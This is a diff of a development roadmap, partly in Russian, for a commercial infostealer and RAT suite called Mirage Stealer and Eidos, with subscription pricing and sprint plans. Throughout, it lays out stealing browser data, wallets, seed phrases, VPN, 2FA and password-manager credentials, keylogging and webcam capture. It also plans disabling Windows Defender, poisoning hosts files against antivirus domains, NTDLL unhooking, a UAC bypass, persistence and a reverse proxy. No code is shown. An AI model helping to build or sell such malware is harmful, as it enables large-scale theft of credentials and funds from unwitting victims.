@@ -18,11 +18,18 @@ EIDS ECOSYSTEM
 │
 ├── Mirage Stealer (Zig, ~123 KB) — кража данных
 │   ├── 100+ браузеров, 80+ кошельков, 12 мессенджеров, 7 игр
+│   ├── 18 VPN clients, 7 2FA authenticators, 8 password managers
+│   ├── Discord billing/gifts, seed phrase grabber (BIP39)
+│   ├── Webcam capture, keylogger (WH_KEYBOARD_LL)
 │   ├── SSP — серверная расшифровка
-│   ├── NTDLL unhook, Stack spoofing, FreshyCalls
-│   ├── Anti-analysis, Geo-block, HWID ban
+│   ├── NTDLL unhook, Stack spoofing, Gadget pool
+│   ├── Anti-analysis (15 checks), Geo-block, HWID ban
+│   ├── Persistence (4 метода: registry + scheduler + startup + WMI)
+│   ├── Hosts file poisoning, Defender disable
+│   ├── SOCKS5 reverse proxy
+│   ├── Chrome Backstage Injection (live browser view)
 │   ├── File grabber + Regex grabber (BIP39/PK/JWT)
-│   └── Self-delete + UAC bypass
+│   └── Self-delete + self-update + UAC bypass
 │
 ├── Eidos Loader (~30 KB, stage 1) — загрузчик
 │   ├── Anti-analysis → HTTP GET payload → Run → Delete
@@ -59,13 +66,13 @@ EIDS ECOSYSTEM
 Phase 1-11: Mirage Stealer Core  ████████████████████  142/142 ✅
 Phase 8b: Integration Tests      ████████████████████   8/8 ✅
 
-Phase 12: Eidos Ecosystem        ████████████████████  16/16 ✅
-Phase 13: Mirage — Infrastructure ████████████████████  22/22 ✅
+Phase 12-13: Eidos Ecosystem     ████████████████████  38/38 ✅
 Phase 14: Eidos Panel (Web)      ██░░░░░░░░░░░░░░░░░░   2/11 ✅
 Phase 15: Eidos Commercial       ░░░░░░░░░░░░░░░░░░░░   0/17
+Phase 16: RAT & Stealer Int.     ░░░░░░░░░░░░░░░░░░░░   0/38 ⬜
 ```
 
-**Total: 142/142 ✅ Done + 192 unit tests ✅ + 110 ⬜ New**
+**Total: 142/142 ✅ Done + 192 unit tests ✅ + 148 ⬜ New**
 
 ---
 
@@ -251,7 +258,53 @@ Phase 15: Eidos Commercial       ░░░░░░░░░░░░░░░�
 
 ---
 
-## Phase 15: Eidos Commercial Launch ⬜
+## Phase 16: RAT & Stealer Integration ⬜
+
+> Интеграция лучших техник из Overlord (RAT), Intelix (stealer), LegionStealerStub (stealer).
+> **Всего:** 38 задач | **Оценка:** ~25 дней
+
+### 16.1 Stealer Engine — EDR/AV Bypass (7 задач, ~5 дней)
+- [ ] Stack Spoofing (Call Stack Obfuscation) — Overlord garble cflow, STORM
+- [ ] Persistence Multi-Method (Registry + Task Scheduler + Startup + WMI) — Overlord
+- [ ] Hosts File Poisoning (29 AV domains → 127.0.0.1) — LegionStealerStub
+- [ ] Windows Defender Disable (Registry + PowerShell) — LegionStealerStub
+- [ ] Anti-VM: Hosting IP Check (ip-api.com/hosting) — LegionStealerStub
+- [ ] NTDLL Unhook (clean .text section restore)
+- [ ] Keylogger (WH_KEYBOARD_LL hook + message loop)
+
+### 16.2 Coverage Expansion — из Intelix (11 задач, ~7 дней)
+- [ ] VPN clients (18: NordVPN, OpenVPN, WireGuard, SurfShark, ExpressVPN, CyberGhost, PIA, Mullvad, Windscribe, TunnelBear, Hotspot Shield, VyprVPN, Hamachi, HideMyName, IpVanish, RadminVPN, SoftEther, ProtonVPN)
+- [ ] 2FA Authenticators (7: Google, Microsoft, Authy, Duo Mobile, OTP Auth, FreeOTP, Aegis)
+- [ ] Password Managers (8: Bitwarden, Dashlane, Keeper, KeePassXC, LastPass, NordPass, RoboForm, 1Password)
+- [ ] Seed Phrase Grabber (BIP39 regex scan across Desktop/Documents/Downloads + cloud storages)
+- [ ] Yandex Passman (Яндекс.Браузер password manager decrypt)
+- [ ] App-Bound v20 Flags 1-3 (CNG NCryptDecrypt fallback) — Intelix
+- [ ] Discord billing/payment scraping + gift codes — LegionStealerStub
+- [ ] Webcam Capture (AVICAP32 / DirectShow COM)
+- [ ] Desktop wallets expansion (+23 → 33 total) — Intelix
+- [ ] Extension wallets expansion (+14 → 76 total) — Intelix
+- [ ] Messengers expansion (+8: Element, ICQ, MicroSIP, Jabber, Outlook, Skype, Tox, Viber)
+
+### 16.3 RAT Capabilities — из Overlord (5 задач, ~10 дней)
+- [ ] Reverse Proxy (SOCKS5 server inside stealer) — Overlord, NyashRat
+- [ ] Chrome Backstage Injection (DLL inject + DXGI capture) — Overlord
+- [ ] Multi-Platform Build (Linux/macOS via Zig targets) — Overlord conditional tags
+- [ ] Self-Supersede / Agent Update (download + replace + re-persist) — Overlord
+- [ ] WASM Plugin Runtime (load collector modules dynamically)
+
+### 16.4 Panel Improvements (8 задач, ~5 дней)
+- [ ] TOTP 2FA Authentication (pyotp-style QR + verify flow) — nexus-stealer
+- [ ] IP Security Scoring (multi-API IP check before login) — nexus-stealer
+- [ ] In-Panel Documentation (docs/ rendered in browser)
+- [ ] Community Chat + Support Tickets (WebSocket, emoji, GIF, @mentions)
+- [ ] Marketplace / Module Store (premium modules with license keys)
+- [ ] Session Management (device tracking + remote terminate)
+- [ ] Public Statistics Page (total logs, crypto %, geo map)
+- [ ] API Key Management (scoped keys with rate limiting)
+
+---
+
+## Summary: Total Tasks
 
 ### 15.1 Pricing
 - [ ] Starter — $70/мес (Mirage Stealer only, basic panel, 1 TG bot)
@@ -287,53 +340,75 @@ Phase 15: Eidos Commercial       ░░░░░░░░░░░░░░░�
 |-------|-------|------------|--------|
 | 1-7. Core (Mirage) | 142 | ✅ Done | **142/142** |
 | 8. Unit Tests | 192 | ✅ Pass | **192/192** |
+| 8b. Integration Tests | 8 | 1 day | **8/8** |
 | 9-11. Expansion (Mirage) | 77 | ✅ Done | **77/77** |
-| 8b. Integration Tests | 8 | 1 day | **0/8** |
-| 12. Eidos Ecosystem | 16 | 5 days | **0/16** |
+| 12. Eidos Ecosystem | 16 | 5 days | **16/16** |
 | 13. Mirage Infrastructure | 22 | ✅ Done | **22/22** |
 | 14. Eidos Panel Premium | 48 | 12 days | **0/48** |
 | 15. Eidos Commercial | 17 | 7 days | **0/17** |
-| **Total** | **219 + 192 tests** | **~30 days** | **142/219 ✅** |
+| 16. RAT & Stealer Integration | 38 | 25 days | **0/38** |
+| **Total** | **257 + 192 tests** | **~52 days** | **142/257 ✅** |
 
 ## Execution Priority
 
-### Sprint 1 (Дни 1-3): Quick Wins
-- Phase 8b: Integration tests
-- Phase 13.5: Redirect proxies (Level 1-2)
+### Sprint 1 (Дни 1-3): Quick Wins — Phase 16
+- Phase 16.1.3: Hosts File Poisoning
+- Phase 16.1.4: Defender Disable
+- Phase 16.1.5: Hosting IP check
+- Phase 16.2.9: Desktop wallets expansion (+23)
+- Phase 16.2.10: Extension wallets expansion (+14)
 
-### Sprint 2 (Дни 4-7): Infrastructure
-- Phase 13.1: Chunked upload
-- Phase 13.2: VPN/FTP/Email clients
-- Phase 13.6: Anti-flood / Firewall
+### Sprint 2 (Дни 4-7): Core EDR Bypass — Phase 16
+- Phase 16.1.1: Stack Spoofing
+- Phase 16.1.6: NTDLL Unhook
+- Phase 16.1.7: Keylogger
+- Phase 16.1.2: Persistence Multi-Method
 
-### Sprint 3 (Дни 8-12): Ecosystem — Clipper + Loader
-- Phase 12.1: Eidos Clipper (отдельный проект)
-- Phase 12.2: Eidos Loader (отдельный проект)
+### Sprint 3 (Дни 8-12): Coverage — VPN + 2FA + PM
+- Phase 16.2.1: VPN clients (18)
+- Phase 16.2.2: 2FA Authenticators (7)
+- Phase 16.2.3: Password Managers (8)
+- Phase 16.2.4: Seed Phrase Grabber
+- Phase 16.2.5: Yandex Passman
+- Phase 16.2.6: App-Bound Flags 1-3
 
-### Sprint 4 (Дни 13-17): Mirage — Coverage
-- Phase 13.3: ICQ messenger
-- Phase 13.4: Firefox extensions
+### Sprint 4 (Дни 13-16): Coverage — Discord + Webcam + Messengers
+- Phase 16.2.7: Discord billing/gifts
+- Phase 16.2.8: Webcam
+- Phase 16.2.11: Messengers (+8: Element, ICQ, MicroSIP, Jabber, Outlook, Skype, Tox, Viber)
 
-### Sprint 5 (Дни 18-24): Panel Premium
+### Sprint 5 (Дни 17-21): RAT Capabilities
+- Phase 16.3.1: Reverse Proxy (SOCKS5)
+- Phase 16.3.4: Self-Supersede / Agent Update
+
+### Sprint 6 (Дни 22-25): Panel + Polish
+- Phase 16.4.1: TOTP 2FA
+- Phase 16.4.2: IP Security Scoring
+- Phase 16.4.3: In-Panel Documentation
+- Phase 16.4.7: Public Statistics
+- Phase 16.4.8: API Key Management
+
+### Sprint 7 (Дни 26-28): Remaining Phase 14-15
 - Phase 14.1-14.5: Smart filters, log detail, builder, TG bots, UI/UX
 - Phase 14.6: Comments/chat system
 
-### Sprint 6 (Дни 25-32): Team & Enterprise
+### Sprint 8 (Дни 29-36): Team & Enterprise
 - Phase 14.7: Team/Multi-user
 - Phase 14.8: Cookie Restore
 - Phase 14.9: Public stats
 - Phase 14.10: API
 - Phase 14.11: PostgreSQL
-
-### Sprint 7 (Дни 33-38): Commercial
 - Phase 14.12: Lifetime licensing
 - Phase 15.1-15.2: Pricing, landing, support
-- Phase 15.5: Eidos Morpher
 
-### Sprint 8 (Дни 39-45): Premium Modules
-- Phase 12.3: Eidos Keylogger
-- Phase 12.4: Eidos Webcam
-- Phase 12.5: Eidos Resident
+### Sprint 9 (Дни 37-45): Advanced — Phase 16 P3-P4
+- Phase 16.3.2: Chrome Backstage Injection
+- Phase 16.3.3: Multi-Platform Build
+- Phase 16.3.5: WASM Plugin Runtime
+- Phase 16.4.4: Community Chat
+- Phase 16.4.5: Marketplace
+- Phase 16.4.6: Session Management
+- Phase 15.3: Eidos Morpher
 - Phase 15.4: OpSec cleanup + launch
 
 ---
